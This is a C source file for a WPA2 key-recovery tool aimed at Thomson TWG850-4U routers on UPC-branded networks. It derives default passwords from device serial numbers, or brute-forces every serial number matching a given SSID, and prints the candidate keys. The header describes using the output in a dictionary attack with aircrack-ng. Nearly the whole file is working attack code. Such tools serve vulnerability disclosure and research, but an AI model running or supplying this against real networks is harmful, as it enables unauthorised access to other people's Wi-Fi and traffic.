/**
 * WPA2 key-recovery for Thomson TWG850-4U UPC%06d networks
 * Copyright (C) 2016 Joseph C. Lehner <joseph.c.lehner@gmail.com>
 *
 * Licensed under the GNU GPLv3.
 *
 * As in the Technicolor TC7200.U, the Wi-Fi SSID and
 * password are derived from the device's serial number.
 * However, for the TWG850-4U, there are around 8000-12000
 * possible WPA2 keys for each UPC%06d network, as opposed
 * to ~20 keys in the TC7200.U (but still good enough for
 * a dictionary attack: aircrack-ng does it in ~4 seconds
 * on a Core i5-6600).
 *
 * The WiFi channel number is also derived from the serial
 * number, but in such a way that it's guaranteed to be either
 * channel 1 or 6 (or 11, but the algorithm used almost never
 * generates channel 11). The distribution is 1/3 channel 1,
 * and 2/3 channel 6. The channel number printed on the bottom
 * label is _not_ used!
 *
 * $ cc upc-twg850.c -o upc-twg850
 *
 * Print WPA2 key and SSID for serial number 00939-907201352
 * $ ./upc-twg850 00930907201352
 *
 * Get serial numbers and WPA2 keys for SSID UPC009065
 * $ ./upc-twg850 UPC009065
 *
 * Same as above, but limit search to channel 6
 * $ ./upc-twg850 UPC009065 6
 */

#include <string.h>
#include <stdint.h>
#include <stdlib.h>
#include <stdio.h>

uint32_t sra(int32_t x, uint32_t n)
{
	if (x < 0 && n > 0) {
		return x >> n | ~(~0U >> n);
	}

	return x >> n;
}

uint32_t to_u32(char *s, size_t beg, size_t len)
{
	char c, *end;
	end	= &s[beg + len];
	c = *end;
	*end = '\0';

	long n = atol(s + beg);
	*end = c;
	return n;
}

// "11111233455555" -> { 11111, 2, 33, 4, 55555 }
void split_sn(char *s, uint32_t *sn)
{
	sn[0] = to_u32(s, 0, 5);
	sn[1] = to_u32(s, 5, 1);
	sn[2] = to_u32(s, 6, 2);
	sn[3] = to_u32(s, 8, 1);
	sn[4] = to_u32(s, 9, 5);
}

void generate_upc_psk_source(uint32_t *sn, char *base)
{
	uint32_t v0, v1, a2;

	v1 = ((((sn[1] << 5) - sn[1]) << 2) + sn[1]) << 3;
	v1 += (((sn[2] << 2)) + sn[2]) << 1;
	v1 += sn[3];

	a2 = v1 * sn[4];
	a2 = (((a2 << 1) + a2) << 2) - a2;

	v0 = a2 / 100000000;
	a2 -= (v0 * 0x5f5e100);

	snprintf(base, 9, "%08d", a2);
}

void generate_upc_psk(uint32_t *sn, char *psk)
{
	char base[9];
	generate_upc_psk_source(sn, base);

	int32_t i = 0;

	do {
		int32_t a1 = i + 1;
		int32_t v0 = (i < 0) ? (i + 8) : (i + 1);
		v0 = (sra(v0, 3) << 3);

		uint32_t b = base[i] * base[a1 - v0];
		uint32_t v1 = b / 26;
		v0 = ((((v1 << 1) + v1) << 2) + v1) << 1;
		psk[i] = (b - v0) + 'A';
	} while (++i < 8);
}

uint32_t generate_upc_ssid(uint32_t *sn)
{
	uint32_t ssid = (sn[2] << 3) + sn[2];
	ssid += (sn[3] << 10) - sn[3];
	ssid += (sn[1] * sn[1]) + ((sn[0] << 1) + sn[0]);
	ssid += 1 + ((sn[4] << 1) + sn[4]);

	uint32_t v1 = ssid / 1000000;
	uint32_t v0 = (((v1 << 5) - v1) << 9) + v1;
	ssid -= (v0 << 6) - v0;
	ssid += 1;

	return ssid;
}

uint32_t generate_upc_channel(uint32_t *sn)
{
	uint32_t v0, v1, a0 = sn[4];
	v0 = a0 / 3;
	v1 = (v0 << 1) + v0;

	if (a0 != v1) {
		if ((a0 - (v0 << 1) + v0) ^ 1) {
			return 6;
		}

		return 11;
	}

	return 1;
}

void print(uint32_t *sn, uint32_t ssid, uint32_t ch)
{
	if (!ch) {
		ch = generate_upc_channel(sn);
	}

	printf("%05d-%d%02d%d%05d  ", sn[0], sn[1], sn[2], sn[3], sn[4]);
	printf("%-2d  ", ch);
	printf("UPC%06d  ", ssid);

	char psk[9];
	generate_upc_psk(sn, psk);
	printf("%.8s  ", psk);

	printf("\n");
}

int main(int argc, char **argv)
{
	if (argc != 2 && argc != 3) {
		fprintf(stderr, "usage: upc-twg850 <serial> | <ssid> [<channel>]\n");
		return 1;
	}

	uint32_t sn[5] = { 0 };
	uint32_t ssid = 0;
	uint32_t ch = 0;

	if (sscanf(argv[1], "UPC%d", &ssid) == 1) {
		if (argc == 3) {
			ch = atoi(argv[2]);
		}

		unsigned i = 0;
		uint32_t sn0[] = { 913, 926, 939 };

		for (; i != sizeof(sn0) / sizeof(sn0[0]); ++i) {
			sn[0] = sn0[i];

			for (sn[1] = 0; sn[1] <= 9; ++sn[1])
			for (sn[2] = 0; sn[2] <= 99; ++sn[2])
			for (sn[3] = 0; sn[3] <= 9; ++sn[3])
			for (sn[4] = 0; sn[4] <= 9999; ++sn[4]) {
				if (ssid != generate_upc_ssid(sn)) {
					continue;
				}

				if (ch && ch != generate_upc_channel(sn)) {
					continue;
				}

				print(sn, ssid, ch);
			}
		}
	} else if (strlen(argv[1]) == 14) {
		split_sn(argv[1], sn);
		ssid = generate_upc_ssid(sn);
		print(sn, ssid, 0);
	}

	return 0;
}
